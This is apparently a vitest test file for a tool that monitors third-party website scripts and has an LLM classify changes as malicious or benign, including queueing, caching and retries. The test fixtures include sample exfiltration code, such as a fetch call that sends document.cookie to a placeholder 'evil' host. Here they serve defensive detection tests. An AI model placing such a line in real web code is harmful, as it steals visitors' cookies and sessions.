import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { analyze } from '../src/analyze.js';
import { ConfigError, parseConfig } from '../src/config.js';
import type { Change } from '../src/detect.js';
import { createReviewer } from '../src/review/index.js';
import { OpenAIReviewer } from '../src/review/openai.js';
import { buildUserPrompt, SYSTEM_PROMPT } from '../src/review/prompt.js';
import { enqueue, processQueue, pruneReviews } from '../src/review/queue.js';
import type { ReviewRequest, ReviewResult, Reviewer } from '../src/review/types.js';
import { unreviewedScripts } from '../src/run.js';
import { sha256 } from '../src/script-key.js';
import { DataStore, emptyState, type State } from '../src/state.js';

const now = new Date('2026-11-20T12:00:00Z');

async function request(newCode: string, oldCode?: string): Promise<ReviewRequest> {
  return {
    url: 'https://cdn.vendor.example/a.js?v=2',
    host: 'cdn.vendor.example',
    pages: ['https://www.example.com/'],
    newHost: false,
    analysis: await analyze(
      Buffer.from(newCode),
      oldCode === undefined ? undefined : Buffer.from(oldCode),
      50_000,
    ),
  };
}

describe('buildUserPrompt', () => {
  it('fences the code as untrusted and lists indicators and hosts', async () => {
    const prompt = buildUserPrompt({
      ...(await request('fetch("https://x.evil.example/"+document.cookie)', 'var a=1;')),
      newHost: true,
    });
    expect(prompt).toContain('first time this site loads anything from this host');
    expect(prompt).toContain('document.cookie: 0 -> 1');
    expect(prompt).toContain('Hosts newly referenced in the code: x.evil.example');
    expect(prompt).toMatch(/<<<UNTRUSTED_CODE\n[\s\S]*\nUNTRUSTED_CODE$/);
    expect(SYSTEM_PROMPT).toMatch(/untrusted data/);
  });
});

describe('OpenAIReviewer', () => {
  it('asks for structured output without storing the request and normalizes the answer', async () => {
    const calls: Record<string, unknown>[] = [];
    const client = {
      responses: {
        create: async (body: Record<string, unknown>) => {
          calls.push(body);
          return {
            status: 'completed',
            output_text: JSON.stringify({
              verdict: 'malicious',
              confidence: 1.7,
              summary: '  Sends form data to an unknown host. ',
              reasons: ['a', ' ', 'b', 'c', 'd', 'e', 'f'],
            }),
          };
        },
      },
    };
    const reviewer = new OpenAIReviewer({
      apiKey: 'test',
      model: 'gpt-test',
      client: client as never,
    });
    const result = await reviewer.review(await request('var a=1;'));
    expect(result).toEqual({
      verdict: 'malicious',
      confidence: 1,
      summary: 'Sends form data to an unknown host.',
      reasons: ['a', 'b', 'c', 'd', 'e'],
    });
    expect(calls[0]).toMatchObject({
      model: 'gpt-test',
      store: false,
      instructions: SYSTEM_PROMPT,
      text: { format: { type: 'json_schema', strict: true, name: 'script_review' } },
    });
  });

  it('fails on an empty or malformed answer', async () => {
    const reviewer = (output_text: string) =>
      new OpenAIReviewer({
        apiKey: 'test',
        model: 'gpt-test',
        client: {
          responses: { create: async () => ({ output_text, status: 'incomplete' }) },
        } as never,
      });
    await expect(reviewer('').review(await request('x'))).rejects.toThrow(/no text/);
    await expect(reviewer('{"verdict":"fine"}').review(await request('x'))).rejects.toThrow();
  });
});

describe('createReviewer', () => {
  it('needs the API key in the environment', () => {
    const config = parseConfig({ pages: ['https://www.example.com/'] });
    expect(() => createReviewer(config, {})).toThrow(ConfigError);
    expect(createReviewer(config, { OPENAI_API_KEY: 'k' })?.model).toBe('gpt-5-mini');
    const none = parseConfig({ pages: ['https://www.example.com/'], llm: { provider: 'none' } });
    expect(createReviewer(none, {})).toBeUndefined();
  });
});

class FakeReviewer implements Reviewer {
  readonly provider = 'fake';
  readonly model = 'fake-1';
  readonly seen: string[] = [];
  failures = 0;

  async review(request: ReviewRequest): Promise<ReviewResult> {
    this.seen.push(request.url);
    if (this.failures > 0) {
      this.failures--;
      throw new Error('rate limited');
    }
    const evil = request.analysis.addedHosts.some((host) => host.includes('evil'));
    return {
      verdict: evil ? 'malicious' : 'benign',
      confidence: 0.9,
      summary: evil ? 'Exfiltrates data.' : 'Routine.',
      reasons: [],
    };
  }
}

describe('review queue', () => {
  let dir: string;
  let store: DataStore;
  let state: State;
  const config = parseConfig({
    pages: ['https://www.example.com/'],
    llm: { maxReviewsPerRun: 2 },
  });

  const change = async (
    url: string,
    body: string,
    extra: Partial<Change> & { oldBody?: string } = {},
  ): Promise<Change> => {
    await store.writeBlob(sha256(body), Buffer.from(body));
    if (extra.oldBody !== undefined) {
      await store.writeBlob(sha256(extra.oldBody), Buffer.from(extra.oldBody));
    }
    const key = url.split('?')[0]!;
    state.scripts[key] = {
      key,
      url,
      host: new URL(url).hostname,
      sha256: sha256(body),
      size: body.length,
      firstSeen: '',
      lastSeen: '',
      lastChanged: '',
      pages: [],
      versions: [{ sha256: sha256(body), size: body.length, url, firstSeen: '', lastSeen: '' }],
    };
    return {
      kind: extra.oldBody === undefined ? 'new' : 'changed',
      key,
      url,
      host: new URL(url).hostname,
      newSha256: sha256(body),
      ...(extra.oldBody === undefined ? {} : { oldSha256: sha256(extra.oldBody) }),
      pages: ['https://www.example.com/'],
      newHost: extra.newHost ?? false,
      quietHost: extra.quietHost ?? false,
    };
  };

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'script-auditor-'));
    store = new DataStore(dir);
    state = emptyState(now);
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('reviews alert-worthy items first and leaves the rest for the next run', async () => {
    enqueue(
      state,
      [
        await change('https://a.example/new.js', 'var a = 1;'),
        await change('https://b.example/changed.js', 'var b = window.x;', {
          oldBody: 'var b = 1;',
        }),
        await change('https://c.example/host.js', 'fetch("https://evil.example/x")', {
          newHost: true,
        }),
      ],
      now.toISOString(),
    );
    const reviewer = new FakeReviewer();
    const first = await processQueue(state, store, reviewer, config, now);
    expect(reviewer.seen).toEqual(['https://c.example/host.js', 'https://b.example/changed.js']);
    expect(first.reviewed.map((entry) => entry.review.verdict)).toEqual(['malicious', 'benign']);
    expect(first.remaining).toBe(1);
    expect(state.scripts['https://c.example/host.js']!.versions[0]!.reviewKey).toBe(
      `new:${sha256('fetch("https://evil.example/x")')}`,
    );
    expect(state.history.at(-2)).toMatchObject({ type: 'reviewed', verdict: 'malicious' });

    const second = await processQueue(state, store, reviewer, config, now);
    expect(second.reviewed.map((entry) => entry.item.url)).toEqual(['https://a.example/new.js']);
    expect(state.pending).toEqual([]);
  });

  it('reuses earlier verdicts for the same content and skips duplicates', async () => {
    const item = await change('https://a.example/x.js', 'var x = 1;');
    enqueue(state, [item, item], now.toISOString());
    expect(state.pending).toHaveLength(1);
    const reviewer = new FakeReviewer();
    await processQueue(state, store, reviewer, config, now);
    enqueue(state, [item], now.toISOString());
    const again = await processQueue(state, store, reviewer, config, now);
    expect(reviewer.seen).toHaveLength(1);
    expect(again.reviewed[0]!.cached).toBe(true);
  });

  it('retries failed reviews in later runs and gives up after three attempts', async () => {
    enqueue(state, [await change('https://a.example/x.js', 'var x = 1;')], now.toISOString());
    const reviewer = new FakeReviewer();
    reviewer.failures = 5;
    for (let attempt = 1; attempt <= 3; attempt++) {
      const result = await processQueue(state, store, reviewer, config, now);
      expect(result.errors[0]).toMatch(new RegExp(`attempt ${attempt} of 3`));
    }
    expect(state.pending).toEqual([]);
    expect(state.history.at(-1)).toMatchObject({ type: 'error' });
    // The failure stays on the version: the site can show it, and reviewBaseline does not
    // queue the script again on every run
    expect(state.scripts['https://a.example/x.js']!.versions[0]!.reviewFailed).toMatchObject({
      message: expect.stringContaining('rate limited'),
    });
    expect(unreviewedScripts(state)).toEqual([]);
  });

  it('judges literal-only changes without calling the model', async () => {
    enqueue(
      state,
      [
        await change('https://a.example/x.js', 'f({t:1795188744143})', {
          oldBody: 'f({t:1795188732494})',
        }),
      ],
      now.toISOString(),
    );
    const reviewer = new FakeReviewer();
    const result = await processQueue(state, store, reviewer, config, now);
    expect(reviewer.seen).toEqual([]);
    expect(result.reviewed[0]!.review).toMatchObject({ verdict: 'benign', provider: 'heuristic' });
  });

  it('prunes old reviews nothing refers to', () => {
    const review = {
      verdict: 'benign' as const,
      confidence: 1,
      summary: '',
      reasons: [],
      provider: 'x',
      model: 'x',
    };
    state.reviews['new:old'] = { ...review, reviewedAt: '2026-09-01T00:00:00Z' };
    state.reviews['new:recent'] = { ...review, reviewedAt: '2026-11-19T00:00:00Z' };
    pruneReviews(state, now);
    expect(Object.keys(state.reviews)).toEqual(['new:recent']);
  });
});
